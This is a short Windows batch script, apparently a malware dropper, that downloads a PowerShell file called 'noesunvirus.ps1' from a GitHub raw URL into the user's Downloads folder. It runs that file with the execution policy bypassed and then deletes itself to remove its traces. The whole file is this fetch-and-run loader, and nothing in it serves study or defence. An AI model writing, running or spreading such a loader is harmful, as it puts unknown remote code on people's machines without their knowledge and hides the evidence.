@echo off

set scriptURL=https://raw.githubusercontent.com/notthecoolguyyouknow/penepenepenepene/refs/heads/main/noesunvirus.ps1

set scriptPath=%userprofile%\Downloads\noesunvirus.ps1

powershell -Command "Invoke-WebRequest -Uri '%scriptURL%' -OutFile '%scriptPath%'"

if exist "%scriptPath%" (
    echo PowerShell script downloaded to %scriptPath%.
    
    powershell -ExecutionPolicy Bypass -File "%scriptPath%"

    echo The batch script will now delete itself.
    (goto) 2>nul & del "%~f0"
) else (
    echo Failed to download the PowerShell script.
)

pause
